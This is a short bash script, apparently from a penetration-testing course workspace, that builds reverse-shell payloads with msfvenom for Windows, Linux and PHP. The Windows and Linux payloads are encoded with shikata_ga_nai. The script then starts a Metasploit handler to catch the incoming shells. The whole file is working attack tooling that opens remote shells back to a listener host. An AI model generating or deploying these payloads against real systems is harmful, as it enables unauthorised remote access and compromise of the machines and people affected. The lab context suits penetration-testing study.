#!/bin/bash

if [ -z "$LHOST" ]; then
    echo >&2 "${0##*/} error: no \$LHOST defined"
    exit 1
fi

LPORT=${1:-443}


msfvenom -p windows/shell_reverse_tcp -a x86 -e x86/shikata_ga_nai LHOST=$LHOST LPORT=$LPORT -f exe -o $HOME/Tests/pen200/rev.exe
echo ''

msfvenom -p linux/x86/shell_reverse_tcp -a x86 -e x86/shikata_ga_nai LHOST=$LHOST LPORT=$LPORT -f elf -o $HOME/Tests/pen200/rev
echo ''

msfvenom -p php/reverse_php --platform php -a php -e generic/none  LHOST=$LHOST LPORT=$LPORT -f raw -o $HOME/Tests/pen200/rev.php
echo ''

# trap '' SIGTSTP
exec msfconsole -q -x "use exploit/multi/handler; set PAYLOAD generic/shell_reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; set ExitOnSession false; exploit -j -z"
# trap - SIGTSTP
